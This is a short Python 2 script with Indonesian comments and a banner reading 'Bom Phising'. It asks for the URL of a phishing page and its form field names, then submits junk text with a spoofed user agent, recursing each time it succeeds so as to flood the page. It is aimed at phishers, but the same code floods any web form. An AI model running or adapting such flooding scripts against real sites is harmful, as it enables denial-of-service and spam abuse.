# buat bikin kapok orang yg suka sebar phising Facebook
import os, sys, mechanize, cookielib, random, time

logo = '''
 ____                  ____  _     _     _
| __ )  ___  _ __ ___ |  _ \| |__ (_)___(_)_ __   __ _
|  _ \ / _ \| '_ ` _ \| |_) | '_ \| / __| | '_ \ / _` |
| |_) | (_) | | | | | |  __/| | | | \__ \ | | | | (_| |
|____/ \___/|_| |_| |_|_|   |_| |_|_|___/_|_| |_|\__, |
                                                 |___/  
Tools untuk ngerjain orang yang suka sebar-sebar phising
'''
print logo
url = str(raw_input('[+] masukkan url phising : '))
next = str(raw_input('[+] masukkan geturl phising : '))
kata = str(raw_input('[+] masukkan kata-kata andalan kamu : '))
emal = str(raw_input('[+] masukkan nama form 1 : '))
emul = str(raw_input('[+] masukkan nama form 2 : '))
wm = 'Tools bom phising created by eror504'
useragents = [
 ('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]

def main():
    global br
    br = mechanize.Browser()
    cj = cookielib.LWPCookieJar()
    br.set_handle_robots(False)
    br.set_handle_redirect(True)
    br.set_cookiejar(cj)
    br.set_handle_equiv(True)
    br.set_handle_referer(True)
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    br.addheaders = [('User-agent', random.choice(useragents))]
    site = br.open(url)
    br.select_form(nr=0)
    br.form[emal] = wm
    br.form[emul] = kata
    sub = br.submit()
    log = sub.geturl()
    if log != url and next not in log:
        print('[-] Bom Phising gagal')
	sys.exit()
    else:
	print('[-] Bom phising berhasil')
	main()

if __name__ == '__main__':
    main()
